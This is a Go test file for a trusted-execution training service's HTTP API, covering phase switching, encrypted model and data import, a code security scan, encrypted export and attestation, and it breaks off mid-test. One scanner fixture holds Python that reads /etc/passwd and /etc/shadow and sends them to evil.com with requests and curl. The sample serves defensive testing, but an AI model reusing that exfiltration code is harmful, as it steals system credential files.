package controller

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	teecrypto "taa/crypto"
)

func setupTestState(t *testing.T) (*TAAState, string) {
	t.Helper()
	tmpDir := t.TempDir()
	attestationPath := filepath.Join(tmpDir, "attestation.report")
	mockReport := bytes.Repeat([]byte{0xAB}, 64)
	if err := os.WriteFile(attestationPath, mockReport, 0o600); err != nil {
		t.Fatalf("write mock attestation: %v", err)
	}

	// 创建 mock helper 脚本：生成 report.cert 和 nonce.bin
	helperPath := filepath.Join(tmpDir, "mock-helper.sh")
	helperScript := `#!/bin/sh
dd if=/dev/urandom of=report.cert bs=1 count=2548 2>/dev/null
# 如果 nonce.bin 已存在则保留（由 Go 预写入），否则生成随机 nonce
if [ ! -f nonce.bin ]; then
    dd if=/dev/urandom of=nonce.bin bs=1 count=16 2>/dev/null
fi
`
	if err := os.WriteFile(helperPath, []byte(helperScript), 0o755); err != nil {
		t.Fatalf("write mock helper: %v", err)
	}

	// 创建临时目录用于测试
	modelDir := filepath.Join(tmpDir, "models")
	dataDir := filepath.Join(tmpDir, "data")
	resultDir := filepath.Join(tmpDir, "results")
	if err := os.MkdirAll(modelDir, 0o755); err != nil {
		t.Fatalf("create model dir: %v", err)
	}
	if err := os.MkdirAll(resultDir, 0o755); err != nil {
		t.Fatalf("create result dir: %v", err)
	}

	if err := os.WriteFile(filepath.Join(resultDir, "result.txt"), []byte("mock training result"), 0o644); err != nil {
		t.Fatalf("write mock result: %v", err)
	}

	sm2Key, err := teecrypto.GenerateSM2KeyPair()
	if err != nil {
		t.Fatalf("generate SM2 key: %v", err)
	}

	state := NewTAAState(attestationPath, "127.0.0.1:65535", "test-docker-001", helperPath, "auto", sm2Key, nil, SecurityConfig{
		ScanEnabled: false,
		ModelDir:    modelDir,
		DataDir:     dataDir,
		ResultCheck: false,
		ResultDir:   resultDir,
	})
	return state, attestationPath
}

func setupTestServer(t *testing.T) (*TAAState, *httptest.Server) {
	t.Helper()
	state, _ := setupTestState(t)
	mux := http.NewServeMux()
	RegisterRoutes(mux, state)
	server := httptest.NewServer(mux)
	t.Cleanup(server.Close)
	return state, server
}

func postJSON(t *testing.T, url string, body any) *http.Response {
	t.Helper()
	data, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal body: %v", err)
	}
	resp, err := http.Post(url, "application/json", bytes.NewReader(data))
	if err != nil {
		t.Fatalf("POST %s: %v", url, err)
	}
	return resp
}

func decodeResponse(t *testing.T, resp *http.Response) apiResponse {
	t.Helper()
	defer resp.Body.Close()
	var api apiResponse
	if err := json.NewDecoder(resp.Body).Decode(&api); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	return api
}

// sealForTAA 用 TAA 的 SM2 公钥对明文做信封加密，返回拼接后的资源数据：
// WrappedKey(129B) || Ciphertext(可变长)
func sealForTAA(t *testing.T, priv *teecrypto.SM2PrivateKey, plaintext []byte) []byte {
	t.Helper()
	sealed, err := teecrypto.SealSM2SM4GCM(&priv.PublicKey, plaintext)
	if err != nil {
		t.Fatalf("SealSM2SM4GCM: %v", err)
	}
	return sealed
}

func openSealedForTAA(t *testing.T, priv *teecrypto.SM2PrivateKey, sealed []byte) []byte {
	t.Helper()
	decrypted, err := teecrypto.OpenSM2SM4GCM(priv, sealed)
	if err != nil {
		t.Fatalf("OpenSM2SM4GCM: %v", err)
	}
	return decrypted
}

// ── Test: /v1/taa/switch ─────────────────────────────────

func TestSwitchHandler(t *testing.T) {
	state, server := setupTestServer(t)

	t.Run("valid switch 1→2", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 2})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if state.CurrentPhase != 2 {
			t.Fatalf("phase = %d, want 2", state.CurrentPhase)
		}
	})

	t.Run("switch 2→4 allowed", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 4})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if state.CurrentPhase != 4 {
			t.Fatalf("phase = %d, want 4", state.CurrentPhase)
		}
	})

	t.Run("valid switch 2→1", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 1})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if state.CurrentPhase != 1 {
			t.Fatalf("phase = %d, want 1", state.CurrentPhase)
		}
	})

	t.Run("invalid phase value", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 99})
		api := decodeResponse(t, resp)
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected failure for phase=99")
		}
	})

	t.Run("method not allowed", func(t *testing.T) {
		resp, err := http.Get(server.URL + "/v1/taa/switch")
		if err != nil {
			t.Fatalf("GET: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusMethodNotAllowed {
			t.Fatalf("status = %d, want 405", resp.StatusCode)
		}
	})
}

// ── Test: /v1/taa/import ─────────────────────────────────

func TestImportHandler(t *testing.T) {
	state, server := setupTestServer(t)

	t.Run("phase1 requires both model and data then runs train.py", func(t *testing.T) {
		reportCh := make(chan importedReportPayload, 1)
		platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			switch r.URL.Path {
			case reportResEndpoint:
				var payload importedReportPayload
				if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
					t.Errorf("decode reportRes payload: %v", err)
					w.WriteHeader(http.StatusBadRequest)
					return
				}
				reportCh <- payload
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer platformServer.Close()

		state.mu.Lock()
		state.PlatformIP = platformServer.URL
		state.DockerID = "docker-phase1"
		sm2Key := state.SM2PrivateKey
		state.mu.Unlock()

		modelArchiveData := buildTarGzArchive(t, map[string]archiveEntry{
			"train.py": {mode: 0o755, data: []byte("#!/usr/bin/env python3\nfrom argparse import ArgumentParser\nfrom pathlib import Path\nimport json\nparser = ArgumentParser(add_help=False)\nparser.add_argument(\"--data-dir\", dest=\"data_dir\", required=True)\nparser.add_argument(\"--output\", \"-o\", dest=\"output_dir\", required=True)\nargs, _ = parser.parse_known_args()\noutput_dir = Path(args.output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\nresult = {\"dataset\": {\"total_samples\": 1, \"splits\": {\"train\": 1, \"test\": 0}}, \"metrics\": {\"loss\": 0.0, \"accuracy\": 1.0}}\n(output_dir / \"marker.txt\").write_text(\"ok\\n\")\n(output_dir / \"training_result.json\").write_text(json.dumps(result, indent=2, ensure_ascii=False) + \"\\n\")\n")},
		})
		modelResourceData := sealForTAA(t, sm2Key, modelArchiveData)

		dataArchiveData := buildTarGzArchive(t, map[string]archiveEntry{
			"sample.txt": {mode: 0o644, data: []byte("training data\n")},
		})
		dataResourceData := sealForTAA(t, sm2Key, dataArchiveData)

		resourceServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.Contains(r.URL.Path, "model") {
				_, _ = w.Write(modelResourceData)
			} else {
				_, _ = w.Write(dataResourceData)
			}
		}))
		defer resourceServer.Close()

		// 获取公钥 PEM 用于 import 请求
		sdkPub := &sm2Key.PublicKey
		pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
		if err != nil {
			t.Fatalf("marshal SM2 public key PEM: %v", err)
		}

		started := time.Now()
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": resourceServer.URL + "/model.tar.gz.enc",
			"requestId":   "req-import-phase1",
			"taskId":      "task-phase1",
			"publicKey":   string(pubPEM),
		})
		elapsed := time.Since(started)
		api := decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		if elapsed > time.Second {
			t.Fatalf("handler returned after %s, want immediate response before background work", elapsed)
		}
		if api.Result != nil {
			t.Fatalf("import result = %#v, want nil", api.Result)
		}

		resp = postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": resourceServer.URL + "/data.tar.gz.enc",
			"requestId":   "req-import-phase1-data",
			"taskId":      "task-phase1",
		})
		api = decodeResponse(t, resp)
		if resp.StatusCode != http.StatusOK || api.Error != 0 {
			t.Fatalf("import data: expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}

		var reportPayload importedReportPayload
		select {
		case reportPayload = <-reportCh:
		case <-time.After(15 * time.Second):
			t.Fatal("timed out waiting for training result report")
		}
		if reportPayload.DockerID != "docker-phase1" || reportPayload.TaskID != "task-phase1" {
			t.Fatalf("reportRes payload = %+v", reportPayload)
		}
		if reportPayload.Report == "" {
			t.Fatal("reportRes payload missing report")
		}
		var report map[string]any
		if err := json.Unmarshal([]byte(reportPayload.Report), &report); err != nil {
			t.Fatalf("reportRes report is not valid JSON: %v", err)
		}
		if report["schema_version"] != "1.0" {
			t.Fatalf("report schema_version = %v, want 1.0", report["schema_version"])
		}
		if _, ok := report["codeaudit"]; ok {
			t.Fatalf("phase1 report should not include codeaudit: %v", report)
		}
		state.mu.RLock()
		modelImported := state.ModelImported
		savedKey := state.ExportPublicKey
		state.mu.RUnlock()
		if !modelImported {
			t.Fatalf("state modelImported = %v, want true", modelImported)
		}
		if savedKey != string(pubPEM) {
			t.Fatalf("ExportPublicKey = %q, want %q", savedKey, string(pubPEM))
		}
	})

	t.Run("phase1 import with invalid publicKey returns error", func(t *testing.T) {
		state, server := setupTestServer(t)
		state.mu.Lock()
		state.CurrentPhase = 1
		state.mu.Unlock()

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/model.tar.gz",
			"requestId":   "req-import-invalid-key",
			"taskId":      "task-invalid-key",
			"publicKey":   "not-a-valid-pem",
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode == http.StatusOK && api.Error == 0 {
			t.Fatalf("expected error for invalid publicKey, got 200/0")
		}
		if !strings.Contains(api.Msg, "publicKey 解析失败") {
			t.Fatalf("unexpected msg: %s", api.Msg)
		}
	})

	t.Run("phase1 import failure does not overwrite saved key", func(t *testing.T) {
		state, server := setupTestServer(t)
		state.mu.Lock()
		state.CurrentPhase = 1
		state.ExportPublicKey = "previous-key"
		state.mu.Unlock()

		resourceServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusNotFound)
		}))
		defer resourceServer.Close()

		sdkPub := &state.SM2PrivateKey.PublicKey
		pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
		if err != nil {
			t.Fatalf("marshal SM2 public key PEM: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": resourceServer.URL + "/missing.tar.gz",
			"requestId":   "req-import-failed-key",
			"taskId":      "task-failed-key",
			"publicKey":   string(pubPEM),
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode == http.StatusOK && api.Error == 0 {
			t.Fatalf("expected error for failed import, got 200/0")
		}

		state.mu.RLock()
		savedKey := state.ExportPublicKey
		state.mu.RUnlock()
		if savedKey != "previous-key" {
			t.Fatalf("ExportPublicKey = %q, want previous-key", savedKey)
		}
	})

	t.Run("import model (download expected to fail with fake URL)", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/model.tar.gz",
			"requestId":   "req-import-001",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败，应该返回错误
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("import data (download expected to fail with fake URL)", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": "http://example.com/data.tar.gz",
			"requestId":   "req-import-002",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败，应该返回错误
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("missing resourceUrl", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"requestId": "req-import-003",
		})
		api := decodeResponse(t, resp)
		if api.Error == 0 {
			t.Fatal("expected error for missing resourceUrl")
		}
	})
}

// ── Test: /v1/taa/import with security scan ──────────────

func TestImportSecurityScan(t *testing.T) {
	// Helper: create a temp dir with model code and return a state with scan enabled.
	setupScanState := func(t *testing.T, code string) (*TAAState, *httptest.Server) {
		t.Helper()
		state, _ := setupTestState(t)
		modelDir := t.TempDir()
		if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
			t.Fatal(err)
		}
		state.Security.ScanEnabled = true
		state.Security.ModelDir = modelDir

		mux := http.NewServeMux()
		RegisterRoutes(mux, state)
		server := httptest.NewServer(mux)
		t.Cleanup(server.Close)
		return state, server
	}

	t.Run("reject malicious code (download will fail with fake URL)", func(t *testing.T) {
		_, server := setupScanState(t, `
import requests
import subprocess
def steal():
    data = open("/etc/passwd").read()
    requests.post("http://evil.com/steal", data=data)
    subprocess.run(["curl", "http://evil.com", "-d", "@/etc/shadow"])
`)
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/malicious.tar.gz",
			"requestId":   "req-scan-001",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败，不会到达安全扫描阶段
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("accept benign code (download will fail with fake URL)", func(t *testing.T) {
		_, server := setupScanState(t, `
import torch
import torch.nn as nn
model = nn.Linear(10, 2)
optimizer = torch.optim.Adam(model.parameters(), lr=0.001)
`)
		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/benign.tar.gz",
			"requestId":   "req-scan-002",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("scan disabled (download will fail with fake URL)", func(t *testing.T) {
		state, _ := setupTestState(t)
		state.Security.ScanEnabled = false // scan off

		mux := http.NewServeMux()
		RegisterRoutes(mux, state)
		server := httptest.NewServer(mux)
		t.Cleanup(server.Close)

		resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
			"resourceUrl": "http://example.com/anything.tar.gz",
			"requestId":   "req-scan-003",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})

	t.Run("data import not scanned (download will fail with fake URL)", func(t *testing.T) {
		_, server := setupScanState(t, `import requests  # this is model code`)
		// data import should not trigger security scan
		resp := postJSON(t, server.URL+"/v1/taa/import", map[string]any{
			"resourceUrl": "http://example.com/data.tar.gz",
			"requestId":   "req-scan-004",
		})
		api := decodeResponse(t, resp)
		// 由于使用假的 URL，下载会失败
		if resp.StatusCode == 200 && api.Error == 0 {
			t.Fatal("expected error for fake URL download")
		}
	})
}

// ── Test: /v1/taa/export ─────────────────────────────────

func TestExportHandler(t *testing.T) {
	state, server := setupTestServer(t)
	sm2Key := state.SM2PrivateKey

	// 准备公钥 PEM
	sdkPub := &sm2Key.PublicKey
	pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
	if err != nil {
		t.Fatalf("marshal SM2 public key PEM: %v", err)
	}

	exportPlaintext := []byte("export test result data")

	t.Run("phase1 without publicKey returns plaintext tar.gz", func(t *testing.T) {
		state.mu.Lock()
		state.CurrentPhase = 1
		state.mu.Unlock()

		debugDir := filepath.Join(state.Security.ResultDir, "debug")
		if err := os.MkdirAll(debugDir, 0o755); err != nil {
			t.Fatalf("create debug dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(debugDir, "phase1.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write debug/phase1.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"taskId": "task-001",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got == "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want not true (plaintext)", got)
		}
		// 验证明文 tar.gz 包含 debug/phase1.bin
		raw, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		files := extractTarGzMap(t, raw)
		if got, ok := files["debug/phase1.bin"]; !ok {
			t.Fatalf("plaintext tar.gz missing debug/phase1.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("plaintext debug/phase1.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("phase1 with publicKey returns encrypted tar.gz", func(t *testing.T) {
		state.mu.Lock()
		state.CurrentPhase = 1
		state.mu.Unlock()

		// Phase 1 正式模式导出 debug 目录
		debugDir := filepath.Join(state.Security.ResultDir, "debug")
		if err := os.MkdirAll(debugDir, 0o755); err != nil {
			t.Fatalf("create debug dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(debugDir, "phase1.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write debug/phase1.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"publicKey": string(pubPEM),
			"taskId":    "task-001-phase1",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want true", got)
		}
	})

	t.Run("phase2 with publicKey returns encrypted tar.gz", func(t *testing.T) {
		state.mu.Lock()
		state.CurrentPhase = 2
		state.mu.Unlock()

		trainDir := filepath.Join(state.Security.ResultDir, "train")
		if err := os.MkdirAll(trainDir, 0o755); err != nil {
			t.Fatalf("create train dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(trainDir, "debug.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write train/debug.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"publicKey": string(pubPEM),
			"taskId":    "task-002",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want true", got)
		}
		sealed, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		decrypted := openSealedForTAA(t, sm2Key, sealed)
		// 解密后应为 tar.gz，验证包含 train/debug.bin
		files := extractTarGzMap(t, decrypted)
		if got, ok := files["train/debug.bin"]; !ok {
			t.Fatalf("decrypted tar.gz missing train/debug.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("decrypted train/debug.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("phase2 without publicKey returns plaintext tar.gz", func(t *testing.T) {
		state.mu.Lock()
		state.CurrentPhase = 2
		state.mu.Unlock()

		trainDir := filepath.Join(state.Security.ResultDir, "train")
		if err := os.MkdirAll(trainDir, 0o755); err != nil {
			t.Fatalf("create train dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(trainDir, "debug.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write train/debug.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"taskId": "task-003",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got == "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want not true (plaintext)", got)
		}
		raw, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		files := extractTarGzMap(t, raw)
		if got, ok := files["train/debug.bin"]; !ok {
			t.Fatalf("plaintext tar.gz missing train/debug.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("plaintext train/debug.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("phase3 with saved key returns encrypted tar.gz", func(t *testing.T) {
		// 设置保存的公钥
		state.mu.Lock()
		state.CurrentPhase = 3
		state.ExportPublicKey = string(pubPEM)
		state.mu.Unlock()

		trainDir := filepath.Join(state.Security.ResultDir, "train")
		if err := os.MkdirAll(trainDir, 0o755); err != nil {
			t.Fatalf("create train dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(trainDir, "train.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write train/train.bin: %v", err)
		}

		// phase3 必须不传 publicKey
		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"publicKey": nil,
			"taskId":    "task-004",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want true", got)
		}
		sealed, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		decrypted := openSealedForTAA(t, sm2Key, sealed)
		files := extractTarGzMap(t, decrypted)
		if got, ok := files["train/train.bin"]; !ok {
			t.Fatalf("decrypted tar.gz missing train/train.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("decrypted train/train.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("phase3 with publicKey returns encrypted tar.gz", func(t *testing.T) {
		state.mu.Lock()
		state.CurrentPhase = 3
		state.ExportPublicKey = string(pubPEM)
		state.mu.Unlock()

		trainDir := filepath.Join(state.Security.ResultDir, "train")
		if err := os.MkdirAll(trainDir, 0o755); err != nil {
			t.Fatalf("create train dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(trainDir, "train.bin"), exportPlaintext, 0o644); err != nil {
			t.Fatalf("write train/train.bin: %v", err)
		}

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"publicKey": string(pubPEM),
			"taskId":    "task-005",
		})
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			t.Fatalf("expected 200, got %d body=%s", resp.StatusCode, body)
		}
		if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
			t.Fatalf("X-TAA-Encrypted = %q, want true", got)
		}
		sealed, err := io.ReadAll(resp.Body)
		if err != nil {
			t.Fatalf("read response body: %v", err)
		}
		decrypted := openSealedForTAA(t, sm2Key, sealed)
		files := extractTarGzMap(t, decrypted)
		if got, ok := files["train/train.bin"]; !ok {
			t.Fatalf("decrypted tar.gz missing train/train.bin, got keys: %v", keysOfMap(files))
		} else if !bytes.Equal(got, exportPlaintext) {
			t.Fatalf("decrypted train/train.bin = %q, want %q", got, exportPlaintext)
		}
	})

	t.Run("phase3 without savedKey returns error", func(t *testing.T) {
		state.mu.Lock()
		state.CurrentPhase = 3
		state.ExportPublicKey = ""
		state.mu.Unlock()

		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"taskId": "task-006",
		})
		defer resp.Body.Close()
		api := decodeResponse(t, resp)
		if resp.StatusCode == http.StatusOK && api.Error == 0 {
			t.Fatalf("expected error for phase3 export without savedKey, got 200/0")
		}
		if !strings.Contains(api.Msg, "阶段 3") {
			t.Fatalf("unexpected msg: %s", api.Msg)
		}
	})

	t.Run("rejects missing taskId", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
			"publicKey": "mock-public-key",
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode != http.StatusBadRequest || api.Error == 0 {
			t.Fatalf("expected taskId validation error, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
	})
}

// ── Test: /v1/taa/getAttestation ─────────────────────────

func TestGetAttestationHandler(t *testing.T) {
	_, server := setupTestServer(t)

	t.Run("success returns json", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/getAttestation", map[string]any{
			"requestId": "req-att-001",
		})
		if resp.StatusCode != 200 {
			resp.Body.Close()
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}
		ct := resp.Header.Get("Content-Type")
		if !strings.Contains(ct, "application/json") {
			resp.Body.Close()
			t.Fatalf("Content-Type = %q, want application/json", ct)
		}
		api := decodeResponse(t, resp)
		if api.Error != 0 {
			t.Fatalf("expected error=0, got %d msg=%s", api.Error, api.Msg)
		}
		result, ok := api.Result.(map[string]any)
		if !ok {
			t.Fatalf("result is not a map: %T", api.Result)
		}
		if result["requestId"] != "req-att-001" {
			t.Fatalf("requestId = %q, want req-att-001", result["requestId"])
		}
		attestationValue, ok := result["attestation"].(string)
		if !ok || attestationValue == "" {
			t.Fatal("attestation is empty")
		}
		decoded, err := base64.StdEncoding.DecodeString(attestationValue)
		if err != nil {
			t.Fatalf("decode base64 attestation: %v", err)
		}
		if len(decoded) != 2548 {
			t.Fatalf("attestation size = %d, want 2548", len(decoded))
		}
		attestationValues, ok := result["attestationValues"].(string)
		if !ok || attestationValues == "" {
			t.Fatal("attestationValues is empty")
		}
	})

	t.Run("missing requestId", func(t *testing.T) {
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		writer.Close()

		req, err := http.NewRequest("POST", server.URL+"/v1/taa/getAttestation", body)
		if err != nil {
			t.Fatalf("create request: %v", err)
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("send request: %v", err)
		}
		api := decodeResponse(t, resp)
		if api.Error == 0 {
			t.Fatal("expected error for missing requestId")
		}
	})
}

// ── Test: /v1/taa/reportRes (平台 → TAA) ────────────────

func TestReportResHandler(t *testing.T) {
	state, server := setupTestServer(t)

	t.Run("success result", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/reportRes", map[string]any{
			"requestId": "req-report-001",
			"code":      0,
			"msg":       nil,
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		state.mu.RLock()
		done := state.TrainingDone
		state.mu.RUnlock()
		if !done {
			t.Fatal("TrainingDone should be true after code=0")
		}
	})

	t.Run("failure result", func(t *testing.T) {
		state.mu.Lock()
		state.TrainingDone = false
		state.mu.Unlock()

		failMsg := "training failed"
		resp := postJSON(t, server.URL+"/v1/taa/reportRes", map[string]any{
			"requestId": "req-report-002",
			"code":      1,
			"msg":       failMsg,
		})
		api := decodeResponse(t, resp)
		if resp.StatusCode != 200 || api.Error != 0 {
			t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
		}
		state.mu.RLock()
		done := state.TrainingDone
		state.mu.RUnlock()
		if done {
			t.Fatal("TrainingDone should remain false after code!=0")
		}
	})

	t.Run("missing requestId", func(t *testing.T) {
		resp := postJSON(t, server.URL+"/v1/taa/reportRes", map[string]any{
			"code": 0,
		})
		api := decodeResponse(t, resp)
		if api.Error == 0 {
			t.Fatal("expected error for missing requestId")
		}
	})
}

// extractTarGzMap 将 tar.gz 字节解压为文件名→内容的映射（跳过目录项）。
func extractTarGzMap(t *testing.T, data []byte) map[string][]byte {
	t.Helper()
	gz, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		t.Fatalf("gzip reader: %v", err)
	}
	defer gz.Close()
	tr := tar.NewReader(gz)
	files := make(map[string][]byte)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("tar next: %v", err)
		}
		if hdr.Typeflag == tar.TypeDir {
			continue
		}
		data, err := io.ReadAll(tr)
		if err != nil {
			t.Fatalf("tar read %s: %v", hdr.Name, err)
		}
		files[hdr.Name] = data
	}
	return files
}

func keysOfMap(m map[string][]byte) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// ── Test: /v1/taa/export with result check ───────────────

func TestExportResultCheck(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ResultCheck = true

	sm2Key := state.SM2PrivateKey
	sdkPub := &sm2Key.PublicKey
	pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
	if err != nil {
		t.Fatalf("marshal SM2 public key PEM: %v", err)
	}

	resultDir := t.TempDir()
	state.Security.ResultDir = resultDir
	resultPlaintext := []byte("model=ok\n")

	// 切换到 phase 2 并准备 train 目录
	state.mu.Lock()
